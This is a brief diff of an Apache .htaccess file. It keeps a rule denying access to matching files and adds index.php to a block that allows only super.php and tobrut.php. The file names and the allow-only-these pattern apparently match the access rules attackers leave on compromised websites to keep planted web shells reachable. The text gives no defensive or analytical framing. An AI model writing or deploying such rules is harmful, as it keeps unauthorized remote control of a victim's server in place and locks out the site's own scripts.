@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(super.php|tobrut.php)$">
+<FilesMatch "^(index.php|super.php|tobrut.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
